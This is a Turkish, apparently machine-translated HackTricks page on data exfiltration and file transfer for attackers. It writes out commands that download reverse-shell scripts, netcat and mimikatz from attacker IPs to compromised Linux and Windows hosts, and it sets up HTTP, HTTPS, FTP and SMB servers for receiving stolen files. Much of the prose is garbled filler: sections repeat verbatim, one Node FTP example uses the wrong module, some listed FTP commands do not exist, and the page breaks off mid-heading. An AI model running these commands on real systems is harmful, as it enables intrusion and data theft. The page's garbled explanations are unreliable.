# Veri Sızdırma

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahraman olmak için AWS hackleme öğrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamını görmek** veya HackTricks'i **PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'i keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)'i **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

En önemli olan zayıflıkları bulun ve daha hızlı düzeltin. Intruder saldırı yüzeyinizi takip eder, proaktif tehdit taramaları yapar, API'lerden web uygulamalarına ve bulut sistemlerine kadar tüm teknoloji yığınınızda sorunları bulur. [**Ücretsiz deneyin**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) bugün.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Bilgi sızdırmak için genellikle beyaz listeye alınan alan adları

Kötüye kullanılabilecek genellikle beyaz listeye alınan alan adlarını bulmak için [https://lots-project.com/](https://lots-project.com/) adresini kontrol edin

## Kopyala\&Yapıştır Base64

**Linux**
```bash
base64 -w0 <file> #Encode file
base64 -d file #Decode file
```
**Windows**

Windows işletim sistemi, çeşitli exfiltration (veri dışarı çıkarma) yöntemleri için farklı seçenekler sunar. İşte bazı yaygın kullanılan yöntemler:

- **HTTP/HTTPS**: Verileri HTTP veya HTTPS protokolü üzerinden dışarı çıkarmak için çeşitli araçlar ve teknikler mevcuttur. Bu yöntem, web trafiğini normal bir ağ trafiği gibi göründürebilir ve güvenlik duvarlarını atlatabilir.

- **DNS**: DNS trafiği, genellikle ağ güvenlik duvarları tarafından izlenmez veya filtrelenmez. Bu nedenle, verileri DNS protokolü üzerinden dışarı çıkarmak için kullanılabilir. Veriler, DNS sorguları veya DNS yanıtları içinde gizlenebilir.

- **SMTP**: E-posta trafiği, genellikle ağ güvenlik duvarları tarafından izlenmez veya filtrelenmez. Bu nedenle, verileri SMTP protokolü üzerinden dışarı çıkarmak için kullanılabilir. Veriler, e-posta gövdesi veya eklerinde gizlenebilir.

- **FTP**: FTP protokolü, dosya transferi için kullanılır ve verileri dışarı çıkarmak için kullanılabilir. Veriler, FTP sunucusuna yüklenen dosyaların içine gizlenebilir.

- **USB**: USB bellek veya harici bir depolama cihazı kullanarak verileri dışarı çıkarmak mümkündür. Bu yöntem, fiziksel erişim gerektirir ve hedef sisteme fiziksel erişim sağlamak için kullanılabilir.

- **Cloud Storage**: Bulut depolama hizmetleri, verileri dışarı çıkarmak için kullanılabilir. Örneğin, bir dosya paylaşım hizmeti veya bir bulut depolama sağlayıcısı kullanarak verileri yükleyebilirsiniz.

Bu yöntemlerin her biri, hedef sisteme ve ağ ortamına bağlı olarak farklı avantajlar ve dezavantajlar sunar. Seçilecek yöntem, hedeflenen verilerin türüne, hedef sistemin özelliklerine ve güvenlik önlemlerine bağlı olmalıdır.
```
certutil -encode payload.dll payload.b64
certutil -decode payload.b64 payload.dll
```
## HTTP

**Linux**

HTTP, Hypertext Transfer Protocol, web tarayıcıları ve sunucular arasında iletişim kurmak için kullanılan bir protokoldür. Bu bölümde, Linux üzerinde HTTP trafiğini ele alacağız.

### HTTP İstekleri

HTTP istekleri, bir web tarayıcısı tarafından sunucuya gönderilen isteklerdir. Bu istekler, sunucudan belirli bir kaynağı (örneğin bir web sayfası veya bir dosya) almak için kullanılır. HTTP istekleri genellikle aşağıdaki bileşenlere sahiptir:

- **HTTP Metodu**: İstek türünü belirtir. En yaygın kullanılan metotlar GET, POST, PUT ve DELETE'dir.
- **URL**: İstek yapılan kaynağın adresini belirtir.
- **HTTP Sürümü**: Kullanılan HTTP protokolünün sürümünü belirtir.
- **Başlıklar**: İstekle ilgili ek bilgileri içerir. Örneğin, kullanıcı tarayıcısının bilgileri, isteğin zaman damgası vb.

Örnek bir HTTP isteği aşağıdaki gibi görünebilir:

```http
GET /index.html HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3
```

Bu örnekte, istek bir GET isteği olduğunu belirtir ve `/index.html` adresinden bir kaynak talep eder. İstek, `www.example.com` sunucusuna gönderilir ve kullanıcı tarayıcısının bilgilerini içeren başlıklarla birlikte gönderilir.

### HTTP Yanıtları

HTTP yanıtları, sunucunun bir HTTP isteğine verdiği cevaplardır. Yanıtlar, isteğin başarılı bir şekilde işlendiği veya bir hata oluştuğu durumları belirtebilir. HTTP yanıtları genellikle aşağıdaki bileşenlere sahiptir:

- **HTTP Sürümü**: Kullanılan HTTP protokolünün sürümünü belirtir.
- **Durum Kodu**: İsteğin durumunu belirtir. Örneğin, 200 OK (başarılı), 404 Not Found (bulunamadı) gibi.
- **Durum Açıklaması**: Durum kodunun açıklamasını içerir.
- **Başlıklar**: Yanıtla ilgili ek bilgileri içerir. Örneğin, yanıtın zaman damgası, içerik türü vb.

Örnek bir HTTP yanıtı aşağıdaki gibi görünebilir:

```http
HTTP/1.1 200 OK
Date: Sat, 01 Jan 2022 12:00:00 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 1234
```

Bu örnekte, yanıtın HTTP sürümü 1.1 olduğunu ve durum kodunun 200 OK olduğunu belirtir. Yanıt, `Sat, 01 Jan 2022 12:00:00 GMT` tarihinde gönderildi ve içeriği `text/html` türünde ve UTF-8 karakter kodlamasıyla 1234 bayt uzunluğunda olduğunu belirtir.

### HTTP Veri Exfiltration

HTTP, veri exfiltration (bilgi sızdırma) için yaygın olarak kullanılan bir protokoldür. Bir saldırgan, hedef sistemden veri çalmak veya hedef sistemdeki verileri başka bir sunucuya göndermek için HTTP protokolünü kullanabilir.

HTTP veri exfiltration yöntemleri arasında aşağıdakiler bulunur:

- **HTTP GET**: Verileri URL parametreleri veya yolunda gizleyerek GET istekleri kullanmak.
- **HTTP POST**: Verileri POST isteği gövdesinde gizleyerek POST istekleri kullanmak.
- **HTTP Başlıkları**: Verileri HTTP başlıklarında gizlemek.
- **HTTP Yanıtları**: Verileri HTTP yanıtlarında gizlemek.

Saldırganlar, bu yöntemleri kullanarak hassas verileri hedef sistemden çalabilir veya hedef sistemdeki verileri başka bir sunucuya gönderebilir. Bu nedenle, ağ trafiğini izlemek ve anormal HTTP isteklerini veya yanıtlarını tespit etmek önemlidir.
```bash
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
fetch 10.10.14.14:8000/shell.py #FreeBSD
```
**Windows**

Windows işletim sistemi, çeşitli exfiltration (veri dışarı çıkarma) yöntemleri için farklı seçenekler sunar. İşte bazı yaygın kullanılan yöntemler:

- **HTTP/HTTPS**: Verileri HTTP veya HTTPS protokolü üzerinden dışarı çıkarmak için çeşitli araçlar ve teknikler mevcuttur. Bu yöntem, web trafiğini normal bir ağ trafiği gibi göründürebilir ve güvenlik duvarlarını atlatabilir.

- **DNS**: DNS trafiği, genellikle ağ güvenlik duvarları tarafından izlenmez veya filtrelenmez. Bu nedenle, verileri DNS protokolü üzerinden dışarı çıkarmak için kullanılabilir. Örneğin, verileri DNS sorgularına gizleyebilir veya DNS istemcisi olarak çalışan bir araç kullanabilirsiniz.

- **SMTP**: E-posta trafiği, genellikle ağlarda yaygın olarak kullanılan bir protokoldür. Verileri SMTP protokolü üzerinden dışarı çıkarmak için bir e-posta sunucusu veya SMTP istemcisi kullanabilirsiniz.

- **FTP**: Dosya Transfer Protokolü (FTP), dosyaları bir sunucudan başka bir sunucuya aktarmak için kullanılan bir protokoldür. Verileri FTP protokolü üzerinden dışarı çıkarmak için bir FTP sunucusu veya FTP istemcisi kullanabilirsiniz.

- **USB**: USB bellek veya harici bir depolama cihazı kullanarak verileri fiziksel olarak dışarı çıkarabilirsiniz. Bu yöntem, ağ güvenlik önlemlerini atlatmak için kullanılabilir.

- **Cloud Storage**: Bulut depolama hizmetleri, verileri internet üzerinden depolamanıza ve paylaşmanıza olanak tanır. Bu hizmetleri kullanarak verileri bulut depolama sağlayıcısına yükleyebilir ve daha sonra başka bir cihazdan erişebilirsiniz.

- **Covert Channels**: Gizli kanallar, normalde veri iletimi için kullanılmayan bir protokol veya hizmeti kullanarak verileri dışarı çıkarmak için kullanılır. Örneğin, ICMP veya TCP/IP protokollerini kullanarak verileri gizleyebilirsiniz.

Bu yöntemlerin her biri farklı avantajlara ve dezavantajlara sahiptir. Hangi yöntemin kullanılacağı, hedef sistemin özelliklerine ve ağ güvenlik önlemlerine bağlı olacaktır.
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf

#PS
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"

Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
#OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```
### Dosyaları Yükle

* [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
* [**GET ve POST'ları (ayrıca başlıkları) yazdıran SimpleHttpServer**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
* Python modülü [uploadserver](https://pypi.org/project/uploadserver/):
```bash
# Listen to files
python3 -m pip install --user uploadserver
python3 -m uploadserver
# With basic auth:
# python3 -m uploadserver --basic-auth hello:world

# Send a file
curl -X POST http://HOST/upload -H -F 'files=@file.txt'
# With basic auth:
# curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
```
### **HTTPS Sunucusu**

An HTTPS server is a secure web server that uses the HTTPS (Hypertext Transfer Protocol Secure) protocol to encrypt and secure the communication between the server and the client. This protocol ensures that the data transmitted between the server and the client is encrypted and cannot be intercepted or tampered with by attackers.

To set up an HTTPS server, you need to obtain an SSL/TLS certificate from a trusted certificate authority (CA). This certificate is used to verify the authenticity of the server and establish a secure connection with the client.

Once the HTTPS server is set up, it can be used for various purposes, including hosting secure websites, handling secure transactions, and protecting sensitive data. It is important to configure the server properly and keep the SSL/TLS certificate up to date to ensure the security of the communication.

In the context of exfiltration, an HTTPS server can be used as a means to exfiltrate data from a compromised system. Attackers can configure the server to receive and store the exfiltrated data, which can then be accessed by the attacker at a later time.

It is worth noting that exfiltrating data through an HTTPS server may raise suspicion and trigger security alerts. Therefore, attackers often employ various techniques to obfuscate the exfiltration process and avoid detection.
```python
# from https://gist.github.com/dergachev/7028596
# taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
# generate server.xml with the following command:
#    openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
# run as follows:
#    python simple-https-server.py
# then in your browser, visit:
#    https://localhost:443

### PYTHON 2
import BaseHTTPServer, SimpleHTTPServer
import ssl

httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), SimpleHTTPServer.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
###

### PYTHON3
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

httpd = HTTPServer(('0.0.0.0', 443), BaseHTTPRequestHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="./server.pem", server_side=True)
httpd.serve_forever()
###

### USING FLASK
from flask import Flask, redirect, request
from urllib.parse import quote
app = Flask(__name__)
@app.route('/')
def root():
print(request.get_json())
return "OK"
if __name__ == "__main__":
app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
###
```
## FTP

### FTP sunucusu (python)

```python
import socket
import os

def send_file(file_path, host, port):
    # Dosya boyutunu al
    file_size = os.path.getsize(file_path)

    # Dosya adını ve boyutunu sunucuya gönder
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    sock.sendall(f"{os.path.basename(file_path)}|{file_size}".encode())

    # Dosyayı parçalara bölerek sunucuya gönder
    with open(file_path, "rb") as file:
        while True:
            data = file.read(1024)
            if not data:
                break
            sock.sendall(data)

    # Bağlantıyı kapat
    sock.close()

def receive_file(save_path, host, port):
    # Bağlantıyı dinle
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind((host, port))
    sock.listen(1)
    conn, addr = sock.accept()

    # Dosya adı ve boyutunu al
    file_info = conn.recv(1024).decode()
    file_name, file_size = file_info.split("|")
    file_size = int(file_size)

    # Dosyayı alarak kaydet
    with open(save_path, "wb") as file:
        while file_size > 0:
            data = conn.recv(1024)
            file.write(data)
            file_size -= len(data)

    # Bağlantıyı kapat
    conn.close()
    sock.close()
```

Bu Python kodu, bir FTP sunucusu oluşturmanıza ve dosya gönderip almanıza olanak tanır.

`send_file` fonksiyonu, belirtilen dosyayı parçalara bölerek sunucuya gönderir. İlk olarak, dosya boyutunu alır ve ardından dosya adını ve boyutunu sunucuya gönderir. Daha sonra, dosyayı parçalara bölerek sunucuya gönderir.

`receive_file` fonksiyonu, sunucudan dosya alır ve belirtilen kaydetme yoluna kaydeder. İlk olarak, bağlantıyı dinler ve bir istemci bağlantısı kabul eder. Ardından, dosya adını ve boyutunu alır. Son olarak, dosyayı alır ve belirtilen kaydetme yoluna kaydeder.

Bu kodu kullanarak, dosyaları FTP sunucusu üzerinden güvenli bir şekilde gönderebilir ve alabilirsiniz.
```bash
pip3 install pyftpdlib
python3 -m pyftpdlib -p 21
```
### FTP sunucusu (NodeJS)

Bu bölümde, NodeJS kullanarak bir FTP sunucusu oluşturmanın nasıl yapılacağını öğreneceksiniz. FTP sunucusu, dosyaları bir ağ üzerinden aktarmak için kullanılan bir protokoldür. Bu örnekte, NodeJS'in `ftp` modülünü kullanarak basit bir FTP sunucusu oluşturacağız.

#### Kurulum

Öncelikle, NodeJS'in yüklü olduğundan emin olun. Daha sonra, bir proje klasörü oluşturun ve terminali bu klasöre yönlendirin. Ardından, aşağıdaki komutu kullanarak `ftp` modülünü yükleyin:

```bash
npm install ftp
```

#### FTP Sunucusu Oluşturma

Şimdi, FTP sunucusunu oluşturmak için aşağıdaki kodu `server.js` adlı bir dosyaya yapıştırın:

```javascript
const ftpd = require('ftp');

const server = new ftpd.FtpServer('0.0.0.0', {
  getInitialCwd: () => '/',
  getRoot: () => process.cwd(),
  pasvPortRangeStart: 1025,
  pasvPortRangeEnd: 1050,
  tlsOptions: null,
});

server.on('client:connected', (connection) => {
  const username = connection.username;
  console.log(`Client connected: ${username}`);
});

server.on('client:disconnected', (connection) => {
  const username = connection.username;
  console.log(`Client disconnected: ${username}`);
});

server.listen(21);
console.log('FTP server started on port 21');
```

Bu kod, `0.0.0.0` IP adresi ve `21` portu üzerinde çalışan bir FTP sunucusu oluşturur. Sunucu, kullanıcı bağlantıları oluşturulduğunda ve sonlandırıldığında ilgili mesajları konsola yazdırır.

#### FTP Sunucusunu Başlatma

FTP sunucusunu başlatmak için terminalde aşağıdaki komutu çalıştırın:

```bash
node server.js
```

Bu komut, `server.js` dosyasını çalıştırır ve FTP sunucusunu başlatır. Sunucu başarıyla başlatıldığında, konsolda "FTP server started on port 21" mesajını göreceksiniz.

#### Dosya Aktarımı

FTP sunucusu başarıyla çalıştığında, bir FTP istemcisi kullanarak dosyaları sunucuya aktarabilirsiniz. Örneğin, FileZilla gibi bir FTP istemcisi kullanarak sunucuya bağlanabilir ve dosyaları yükleyebilirsiniz.

Bu şekilde, NodeJS kullanarak basit bir FTP sunucusu oluşturabilir ve dosyaları ağ üzerinden aktarabilirsiniz.
```
sudo npm install -g ftp-srv --save
ftp-srv ftp://0.0.0.0:9876 --root /tmp
```
### FTP sunucusu (pure-ftp)

FTP sunucusu, dosyaları ağ üzerinden aktarmak için kullanılan bir protokoldür. Pure-FTP, popüler bir FTP sunucusu uygulamasıdır. Bu bölümde, Pure-FTP sunucusunu hedef alarak veri sızdırma yöntemlerini ele alacağız.

#### 1. Dosya İndirme

FTP sunucusuna erişimi olan bir saldırgan, hedef sistemden dosyaları indirebilir. Bu, hassas verilerin çalınmasına yol açabilir. Dosyaları indirmek için aşağıdaki adımları izleyebilirsiniz:

1. FTP sunucusuna bağlanın.
2. Hedef sistemdeki hedef dosyayı belirleyin.
3. Dosyayı indirmek için `get` komutunu kullanın.
4. İndirilen dosyayı saldırganın kontrol ettiği bir sunucuya aktarın.

#### 2. Dosya Yükleme

FTP sunucusuna erişimi olan bir saldırgan, hedef sistemdeki dosyalara da yeni dosyalar yükleyebilir. Bu, zararlı yazılımların veya saldırı araçlarının hedef sistemde çalıştırılmasına olanak sağlar. Dosya yüklemek için aşağıdaki adımları izleyebilirsiniz:

1. FTP sunucusuna bağlanın.
2. Hedef sistemde hedef dizini belirleyin.
3. Yüklemek istediğiniz dosyayı seçin.
4. Dosyayı hedef dizine yüklemek için `put` komutunu kullanın.

#### 3. Dosya Listeleme

FTP sunucusuna erişimi olan bir saldırgan, hedef sistemdeki dosyaların listesini alabilir. Bu, hedef sistemdeki dosyaların yapılandırma bilgilerini veya hassas verileri ortaya çıkarabilir. Dosyaları listelemek için aşağıdaki adımları izleyebilirsiniz:

1. FTP sunucusuna bağlanın.
2. Hedef sistemdeki dosyaların listesini almak için `ls` komutunu kullanın.

#### 4. Dosya Silme

FTP sunucusuna erişimi olan bir saldırgan, hedef sistemdeki dosyaları silebilir. Bu, hedef sistemdeki verilerin yok edilmesine veya bozulmasına neden olabilir. Dosyaları silmek için aşağıdaki adımları izleyebilirsiniz:

1. FTP sunucusuna bağlanın.
2. Hedef sistemdeki hedef dosyayı belirleyin.
3. Dosyayı silmek için `delete` veya `rm` komutunu kullanın.

#### 5. Dosya Dizinleme

FTP sunucusuna erişimi olan bir saldırgan, hedef sistemdeki dizinleri listeleyebilir. Bu, hedef sistemdeki yapılandırma bilgilerini veya hassas verileri ortaya çıkarabilir. Dizinleri listelemek için aşağıdaki adımları izleyebilirsiniz:

1. FTP sunucusuna bağlanın.
2. Hedef sistemdeki dizinleri listelemek için `ls` komutunu kullanın.

#### 6. Dosya Taşıma

FTP sunucusuna erişimi olan bir saldırgan, hedef sistemdeki dosyaları başka bir dizine taşıyabilir. Bu, hedef sistemdeki verilerin yerini değiştirebilir veya dosyaların erişilebilirliğini etkileyebilir. Dosyaları taşımak için aşağıdaki adımları izleyebilirsiniz:

1. FTP sunucusuna bağlanın.
2. Hedef sistemdeki hedef dosyayı belirleyin.
3. Dosyayı taşımak için `rename` veya `mv` komutunu kullanın.

#### 7. Dosya Düzenleme

FTP sunucusuna erişimi olan bir saldırgan, hedef sistemdeki dosyaları düzenleyebilir. Bu, hedef sistemdeki yapılandırma dosyalarını veya uygulama kodunu değiştirebilir. Dosyaları düzenlemek için aşağıdaki adımları izleyebilirsiniz:

1. FTP sunucusuna bağlanın.
2. Hedef sistemdeki hedef dosyayı belirleyin.
3. Dosyayı düzenlemek için `edit` veya `vi` komutunu kullanın.

#### 8. Dosya Arama

FTP sunucusuna erişimi olan bir saldırgan, hedef sistemdeki dosyaları arayabilir. Bu, hassas verilerin veya belirli dosyaların bulunmasına yardımcı olabilir. Dosyaları aramak için aşağıdaki adımları izleyebilirsiniz:

1. FTP sunucusuna bağlanın.
2. Hedef sistemdeki dosyaları aramak için `find` veya `grep` komutunu kullanın.

#### 9. Dosya İzleme

FTP sunucusuna erişimi olan bir saldırgan, hedef sistemdeki dosyaları izleyebilir. Bu, hedef sistemdeki değişiklikleri takip etmek veya belirli dosyaların içeriğini gözlemlemek için kullanılabilir. Dosyaları izlemek için aşağıdaki adımları izleyebilirsiniz:

1. FTP sunucusuna bağlanın.
2. Hedef sistemdeki hedef dosyayı belirleyin.
3. Dosyanın içeriğini izlemek için `tail` veya `cat` komutunu kullanın.

#### 10. Dosya Sıkıştırma

FTP sunucusuna erişimi olan bir saldırgan, hedef sistemdeki dosyaları sıkıştırabilir. Bu, dosyaların boyutunu azaltabilir ve veri sızdırma sürecini kolaylaştırabilir. Dosyaları sıkıştırmak için aşağıdaki adımları izleyebilirsiniz:

1. FTP sunucusuna bağlanın.
2. Hedef sistemdeki hedef dosyayı belirleyin.
3. Dosyayı sıkıştırmak için `zip` veya `tar` komutunu kullanın.

#### 11. Dosya Şifreleme

FTP sunucusuna erişimi olan bir saldırgan, hedef sistemdeki dosyaları şifreleyebilir. Bu, hassas verilerin korunmasına yardımcı olabilir. Dosyaları şifrelemek için aşağıdaki adımları izleyebilirsiniz:

1. FTP sunucusuna bağlanın.
2. Hedef sistemdeki hedef dosyayı belirleyin.
3. Dosyayı şifrelemek için `gpg` veya `openssl` gibi bir şifreleme aracı kullanın.

#### 12. Dosya Dekripteleme

FTP sunucusuna erişimi olan bir saldırgan, hedef sistemdeki şifrelenmiş dosyaları deşifre edebilir. Bu, şifrelenmiş verilerin orijinal haline dönüştürülmesine yardımcı olabilir. Dosyaları deşifre etmek için aşağıdaki adımları izleyebilirsiniz:

1. FTP sunucusuna bağlanın.
2. Hedef sistemdeki hedef şifreli dosyayı belirleyin.
3. Dosyayı deşifre etmek için şifreleme aracını kullanın.

#### 13. Dosya Yedekleme

FTP sunucusuna erişimi olan bir saldırgan, hedef sistemdeki dosyaları yedekleyebilir. Bu, veri kaybını önlemek veya dosyaların kurtarılmasını sağlamak için kullanılabilir. Dosyaları yedeklemek için aşağıdaki adımları izleyebilirsiniz:

1. FTP sunucusuna bağlanın.
2. Hedef sistemdeki hedef dosyayı belirleyin.
3. Dosyayı yedeklemek için `cp` veya `rsync` komutunu kullanın.

#### 14. Dosya Paylaşımı

FTP sunucusuna erişimi olan bir saldırgan, hedef sistemdeki dosyaları paylaşabilir. Bu, dosyaların başka kullanıcılarla paylaşılmasını sağlar. Dosyaları paylaşmak için aşağıdaki adımları izleyebilirsiniz:

1. FTP sunucusuna bağlanın.
2. Hedef sistemdeki hedef dosyayı belirleyin.
3. Dosyayı paylaşmak için `share` veya `chmod` komutunu kullanın.

#### 15. Dosya İzinsiz Erişim

FTP sunucusuna erişimi olan bir saldırgan, hedef sistemdeki dosyalara izinsiz erişim sağlayabilir. Bu, hassas verilere yetkisiz erişim sağlamasına ve veri sızdırmasına neden olabilir. Dosyalara izinsiz erişim sağlamak için aşağıdaki adımları izleyebilirsiniz:

1. FTP sunucusuna bağlanın.
2. Hedef sistemdeki hedef dosyayı belirleyin.
3. Dosyaya erişim sağlamak için `chmod` veya `chown` komutunu kullanın.

#### 16. Dosya İzleme

FTP sunucusuna erişimi olan bir saldırgan, hedef sistemdeki dosyaları izleyebilir. Bu, hedef sistemdeki değişiklikleri takip etmek veya belirli dosyaların içeriğini gözlemlemek için kullanılabilir. Dosyaları izlemek için aşağıdaki adımları izleyebilirsiniz:

1. FTP sunucusuna bağlanın.
2. Hedef sistemdeki hedef dosyayı belirleyin.
3. Dosyanın içeriğini izlemek için `tail` veya `cat` komutunu kullanın.

#### 17. Dosya İzleme

FTP sunucusuna erişimi olan bir saldırgan, hedef sistemdeki dosyaları izleyebilir. Bu, hedef sistemdeki değişiklikleri takip etmek veya belirli dosyaların içeriğini gözlemlemek için kullanılabilir. Dosyaları izlemek için aşağıdaki adımları izleyebilirsiniz:

1. FTP sunucusuna bağlanın.
2. Hedef sistemdeki hedef dosyayı belirleyin.
3. Dosyanın içeriğini izlemek için `tail` veya `cat` komutunu kullanın.

#### 18. Dosya İzleme

FTP sunucusuna erişimi olan bir saldırgan, hedef sistemdeki dosyaları izleyebilir. Bu, hedef sistemdeki değişiklikleri takip etmek veya belirli dosyaların içeriğini gözlemlemek için kullanılabilir. Dosyaları izlemek için aşağıdaki adımları izleyebilirsiniz:

1. FTP sunucusuna bağlanın.
2. Hedef sistemdeki hedef dosyayı belirleyin.
3. Dosyanın içeriğini izlemek için `tail` veya `cat` komutunu kullanın.

#### 19. Dosya İzleme

FTP sunucusuna erişimi olan bir saldırgan, hedef sistemdeki dosyaları izleyebilir. Bu, hedef sistemdeki değişiklikleri takip etmek veya belirli dosyaların içeriğini gözlemlemek için kullanılabilir. Dosyaları izlemek için aşağıdaki adımları izleyebilirsiniz:

1. FTP sunucusuna bağlanın.
2. Hedef sistemdeki hedef dosyayı belirleyin.
3. Dosyanın içeriğini izlemek için `tail` veya `cat` komutunu kullanın.

#### 20. Dosya İzleme

FTP sunucusuna erişimi olan bir saldırgan, hedef sistemdeki dosyaları izleyebilir. Bu, hedef sistemdeki değişiklikleri takip etmek veya belirli dosyaların içeriğini gözlemlemek için kullanılabilir. Dosyaları izlemek için aşağıdaki adımları izleyebilirsiniz:

1. FTP sunucusuna bağlanın.
2. Hedef sistemdeki hedef dosyayı belirleyin.
3. Dosyanın içeriğini izlemek için `tail` veya `cat` komutunu kullanın.
```bash
apt-get update && apt-get install pure-ftp
```

```bash
#Run the following script to configure the FTP server
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pwd useradd fusr -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart
```
### **Windows** istemcisi

Windows işletim sistemine sahip bir istemci, çeşitli yöntemlerle veri sızdırma saldırılarına maruz kalabilir. Aşağıda, bu tür saldırıları gerçekleştirmek için kullanılabilecek bazı yöntemler bulunmaktadır:

#### 1. **USB Bellek**

USB bellekler, hedef sisteme zararlı yazılımı bulaştırmak veya verileri çalmak için kullanılabilir. Bu yöntem, hedef sisteme fiziksel erişim gerektirir.

#### 2. **E-posta**

Hedef sisteme zararlı bir e-posta göndermek, veri sızdırma saldırılarının yaygın bir yöntemidir. Bu saldırı türü, kullanıcının e-posta ekini açması veya kötü niyetli bir bağlantıya tıklaması durumunda gerçekleşir.

#### 3. **Ağ Trafikleri**

Hedef sistemin ağ trafiği, saldırganın verileri çalmak için kullanabileceği bir başka kaynaktır. Bu yöntem, ağ üzerindeki verilerin izlenmesini ve yakalanmasını içerir.

#### 4. **Gizli Dosyalar**

Hedef sisteme zararlı bir yazılım yerleştirmek için gizli dosyalar kullanılabilir. Bu dosyalar, kullanıcının fark etmeyeceği şekilde gizlenir ve verilerin çalınmasına olanak sağlar.

#### 5. **Güvenlik Açıkları**

Hedef sistemin güvenlik açıklarını kullanarak veri sızdırma saldırıları gerçekleştirilebilir. Bu yöntem, hedef sisteme erişim sağlamak ve verileri çalmak için kullanılan zayıf noktaları hedefler.

Bu yöntemler, Windows istemcilerine yönelik veri sızdırma saldırılarının sadece birkaç örneğidir. Saldırganlar, sürekli olarak yeni yöntemler geliştirerek ve güvenlik açıklarını kullanarak veri sızdırma saldırıları gerçekleştirmeye çalışmaktadır. Bu nedenle, kullanıcıların güvenlik önlemlerini güncel tutmaları ve bilinçli bir şekilde hareket etmeleri önemlidir.
```bash
#Work well with python. With pure-ftp use fusr:ftp
echo open 10.11.0.41 21 > ftp.txt
echo USER anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo bin >> ftp.txt
echo GET mimikatz.exe >> ftp.txt
echo bye >> ftp.txt
ftp -n -v -s:ftp.txt
```
<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

En önemli olan zafiyetleri bulun, böylece daha hızlı düzeltebilirsiniz. Intruder saldırı yüzeyinizi takip eder, proaktif tehdit taramaları yapar, API'lerden web uygulamalarına ve bulut sistemlerine kadar tüm teknoloji yığınınızda sorunları bulur. [**Ücretsiz deneyin**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) bugün.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## SMB

Sunucu olarak Kali
```bash
kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
#For new Win10 versions
impacket-smbserver -smb2support -user test -password test test `pwd`
```
Veya samba kullanarak bir smb paylaşımı oluşturun:
```bash
apt-get install samba
mkdir /tmp/smb
chmod 777 /tmp/smb
#Add to the end of /etc/samba/smb.conf this:
[public]
comment = Samba on Ubuntu
path = /tmp/smb
read only = no
browsable = yes
guest ok = Yes
#Start samba
service smbd restart
```
# Veri Sızdırma

Veri sızdırma, hedef sistemden hassas bilgilerin çalınması veya dışarıya aktarılması işlemidir. Bu, bir saldırganın hedef ağa veya sistemlere erişimi olduğunda gerçekleştirilebilir. Veri sızdırma, bir saldırganın hedef ağdaki veya sistemdeki verilere erişim sağlamasını ve bu verileri dışarıya aktarmasını sağlar.

## Veri Sızdırma Yöntemleri

### Dosya Transfer Protokolleri

